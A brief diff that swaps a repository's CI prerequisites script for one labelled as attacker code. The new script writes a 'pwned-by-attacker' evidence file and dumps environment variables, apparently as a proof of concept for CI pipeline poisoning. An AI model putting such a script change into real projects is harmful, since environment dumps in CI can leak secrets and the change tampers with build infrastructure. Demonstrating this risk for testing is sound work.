@@ -1,2 +1,3 @@
-#!/usr/bin/env bash
-echo "DEFAULT repo ci-prerequisites: nothing dangerous"
+echo "ATTACKER: ci-prerequisites ran"
+echo "pwned-by-attacker" > attacker_evidence_prereq.txt
+env | head -n 20 || true
